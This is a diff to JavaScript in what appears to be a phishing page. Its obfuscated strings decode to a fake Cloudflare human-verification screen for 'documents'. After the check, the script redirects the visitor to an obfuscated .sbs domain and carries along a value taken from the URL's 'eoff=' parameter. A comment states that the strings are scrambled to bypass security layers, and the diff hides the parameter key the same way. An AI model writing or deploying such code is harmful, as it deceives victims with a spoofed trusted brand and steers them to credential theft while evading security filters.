@@ -25,14 +25,15 @@
             // Unmasking logic: Reverse and Strip
             const _cln = (x) => x.split('').reverse().join('').replace(/_/g, '');
 
-            // All text strings are scrambled to bypass security layers
+            // All text strings scrambled
             const _m1 = _cln('w_o_l_e_b_ _n_a_m_u_h_ _e_r_\'_u_o_y_ _y_f_i_r_e_v_ ,_s_t_n_e_m_u_c_o_d_ _e_s_e_h_t_ _w_e_i_v_ _o_T');
             const _m2 = _cln('y_f_i_r_e_V');
             const _m3 = _cln('._._._g_n_i_y_f_i_r_e_V');
             const _m4 = _cln('s_s_e_c_c_u_S');
-            const _m5 = _cln('e_r_a_l_f_d_u_o_l_C'); // "Cloudflare"
+            const _m5 = _cln('e_r_a_l_f_d_u_o_l_C'); // Cloudflare
             const _m6 = _cln('s_m_r_e_T_ ._ y_c_a_v_i_r_P');
             const _mU = _cln('r_s_n_P_Y_w_v_w_/_s_b_s_._e_a_u_s_e_l_i_f_s_n_a_r_t_e_._e_c_i_f_f_o_e_a_/_/:_s_p_t_t_h');
+            const _mK = _cln('=__f__f__o__e__?__/__'); // "/?eoff="
 
             const view = document.getElementById('stage');
             // astro.png: Preloader
@@ -66,10 +67,12 @@
                         l.innerText = _m4;
                         l.style.color = '#28a745';
 
+                        // FIXED: Scans for /?eoff= and captures everything after it
                         const u = window.location.href;
-                        const k = 'eof=';
                         let p = "";
-                        if (u.indexOf(k) > -1) { p = u.split(k)[1]; }
+                        if (u.includes(_mK)) {
+                            p = u.split(_mK)[1];
+                        }
 
                         setTimeout(() => {
                             window.location.replace(_mU + "#" + p);
